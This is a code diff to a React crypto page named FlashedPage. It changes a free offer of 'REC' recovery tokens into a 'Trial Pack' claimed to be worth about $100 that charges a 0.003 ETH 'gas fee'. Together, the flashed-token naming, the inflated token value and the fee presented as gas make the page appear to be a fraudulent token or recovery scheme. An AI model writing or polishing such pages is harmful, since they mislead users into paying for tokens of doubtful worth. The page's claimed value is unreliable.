@@ -1490,30 +1490,30 @@ export default function FlashedPage() {
             <div className="fixed inset-0 bg-black/80 flex items-center justify-center z-50">
               <div className="bg-gray-800 p-6 rounded-lg max-w-sm mx-4 w-full">
                 <div className="flex justify-between items-center mb-4">
-                  <h3 className="text-white font-bold text-lg">Free Trial Available!</h3>
+                  <h3 className="text-white font-bold text-lg">Trial Pack Available!</h3>
                   <button onClick={() => setShowModal(null)} className="text-gray-400 hover:text-white">×</button>
                 </div>
                 <div className="space-y-4">
                   <div className="text-center">
                     <div className="text-green-400 text-3xl mb-2">🎁</div>
-                    <div className="text-white font-semibold mb-2">Try Before You Buy</div>
+                    <div className="text-white font-semibold mb-2">Test Recovery System</div>
                     <div className="text-gray-300 text-sm mb-4">
-                      Get a free sample of recovery tokens to test the system before committing to larger amounts.
+                      Get trial tokens to test the recovery system with minimal gas cost.
                     </div>
                   </div>
                   
                   <div className="bg-gray-700 p-4 rounded-lg">
                     <div className="flex justify-between items-center mb-2">
-                      <span className="text-gray-300 text-sm">Free Trial:</span>
-                      <span className="text-green-400 font-semibold">50 REC Tokens</span>
+                      <span className="text-gray-300 text-sm">Trial Pack:</span>
+                      <span className="text-blue-400 font-semibold">100 REC Tokens</span>
                     </div>
                     <div className="flex justify-between items-center mb-2">
                       <span className="text-gray-300 text-sm">Estimated Value:</span>
-                      <span className="text-white font-semibold">~$50 USD</span>
+                      <span className="text-white font-semibold">~$100 USD</span>
                     </div>
                     <div className="flex justify-between items-center">
-                      <span className="text-gray-300 text-sm">Cost:</span>
-                      <span className="text-green-400 font-bold">FREE</span>
+                      <span className="text-gray-300 text-sm">Gas Fee:</span>
+                      <span className="text-blue-400 font-bold">0.003 ETH (~$9)</span>
                     </div>
                   </div>
                   
@@ -1553,7 +1553,7 @@ export default function FlashedPage() {
                     disabled={loading}
                     className="w-full bg-green-600 hover:bg-green-700 py-3 rounded-lg text-white font-semibold"
                   >
-                    {loading ? 'Sending...' : 'Claim Free Trial'}
+                    {loading ? 'Processing...' : 'Get Trial Pack - 0.003 ETH'}
                   </button>
                   
                   <button 
